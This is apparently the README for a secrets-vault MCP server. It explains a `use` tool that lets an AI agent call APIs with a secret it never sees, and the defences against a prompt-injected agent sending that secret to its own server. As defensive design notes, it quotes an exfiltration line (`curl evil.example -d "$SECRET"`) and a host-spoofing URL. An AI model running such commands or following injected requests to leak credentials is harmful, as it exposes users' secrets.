# MCP server for AI agents (0.41.6: `use`)

`mcp/server.py` gives an AI agent (Claude, any MCP host) the secrets of **one folder** — the folder of its service
token — over the stdio transport.

```json
{ "mcpServers": { "aps-vault": {
    "command": "python3", "args": ["/opt/aps-vault-mcp/server.py"],
    "env": { "VAULT_URL": "https://vault.example.com", "VAULT_TOKEN": "vlt_…",
             "APS_MCP_USE_HOSTS": "", "APS_MCP_DISABLE_GET": "1" } } } }
```

`pip install 'mcp[cli]' httpx` next to it (tested with `mcp` 1.28.0 through the real protocol —
`backend/tests/test_mcp_server.py`).

## Tools

| Tool | What the agent gets | Since |
|---|---|---|
| `health` | the token's name, folder and flags | 0.3 |
| `list_secrets` | names, tags, `url`, flags — no values | 0.3 |
| `get(name, include_notes?, include_totp?, version?)` | **the value itself** | 0.3 |
| `put(name, value, notes?)` | writes; needs `can_write` on the token **and** `APS_MCP_ALLOW_WRITE=1` | 0.3 / 0.37 |
| `use(name, url, method?, headers?, body?)` | the **response** of a request made with the secret — never the secret | 0.41.6 |

`health`, `list_secrets`, `get` and `put` are unchanged: an agent configured before 0.41.6 keeps working.

## Why `use`

`get` puts the value into the model's context. From there it can reach the provider that runs the model, the
conversation log, a tool call the model decides to make, or a prompt injection that asks for it. Folder scoping limits
*which* secrets are exposed, not *that* they are. For most of what an agent does with a secret — call an API — it does
not need to see it:

```
use("github-token", "https://api.github.com/user/repos",
    headers={"Authorization": "Bearer {{secret}}"})
→ {"status": 200, "headers": {"content-type": "application/json"}, "body": "[{…}]", "redacted": 0, "host": "api.github.com"}
```

Placeholders: `{{secret}}` (the value), `{{login}}` (the record's login), `{{basic}}` (`base64(login:value)` for
`Authorization: Basic`). They go in the URL's path or query, in header values and in the body. A body given as a JSON
object is filled inside its strings and then serialised, so a quote or backslash in the secret stays valid JSON.

## What stops the agent from sending the secret somewhere else

A prompt-injected agent would simply `use` the secret against its own server. So:

1. **The secret is bound to a host.** The request may go only to the host of the record's own `url` field — set it
   when you store the secret (`https://api.github.com`), the same binding a browser's autofill uses — or to a host the
   operator lists in `APS_MCP_USE_HOSTS` (`api.example.com,*.internal.example.com`). Anything else is refused before the
   secret is even fetched; a record without `url` goes nowhere unless the operator lists the host.
2. **HTTPS only**; plain HTTP only to hosts from `APS_MCP_USE_HOSTS` (an internal service the operator chose).
3. **The host is fixed before substitution.** A placeholder in the host part is refused, the host is parsed from the
   URL as given (`https://allowed@evil/` goes to `evil` and is refused).
4. **No redirects.** A 3xx comes back with its `location`; following it with the secret attached is up to nobody.
5. **The response is redacted.** Every stretch of the response that repeats 8 or more consecutive characters of the
   value — raw, percent-encoded, base64, JSON-escaped, inside `{{basic}}` — becomes `[REDACTED]` (a shorter value: the
   whole value). This catches a target that echoes the request back, also partly encoded or escaped twice (both were
   real leaks found by the test while building this).
6. **The vault's audit shows it.** The read is logged as `m:secret:read` with user agent `aps-vault-mcp/use host=<host>`.

`APS_MCP_DISABLE_GET=1` turns `get` off: for an agent that should only ever `use`, the value never enters its context.
Recommended for new agents; off by default only so that existing configurations keep working.

## What `use` does not do

- **It does not make the agent harmless.** At the allowed host, the agent can do everything the secret allows —
  delete a repository with a GitHub token. Give the agent a secret whose rights match its job.
- **Redaction is a second line, not the first.** A target that returns the secret transformed beyond recognition
  (hashed with a salt, split into single characters) is not caught. The host binding is what keeps the secret from a
  server that would do that; choose the `url` and `APS_MCP_USE_HOSTS` accordingly.
- **No commands.** Running a local program with the secret in its environment was considered and left out: the model
  would choose the command, and `curl evil.example -d "$SECRET"` is a command.
- **Sealed tokens** (bound to a client key) are not for the MCP server: it has no private key — issue the agent a plain
  token.

## Verified how

`backend/tests/test_mcp_server.py` starts `mcp/server.py` through the official MCP client over stdio against a live
vault; every target is a local HTTPS echo server that records what reached it, so "not sent" is checked where it would
have arrived. Cases: the four old tools unchanged; `use` with `{{secret}}` in the query, a Bearer header,
`{{basic}}` and a JSON body — the target got the real values, the agent got none of them (no 8 characters of any form);
refused: another host, the placeholder in the host, `allowed@other`, HTTP to the secret's own host, a record without
`url`, no placeholder, a secret outside the folder — the other server received nothing; a 302 is returned, not
followed; a host from `APS_MCP_USE_HOSTS` works for a record without `url`; `get` switched off; the audit names both hosts. The redaction
was checked to fail the test when weakened to exact matches.
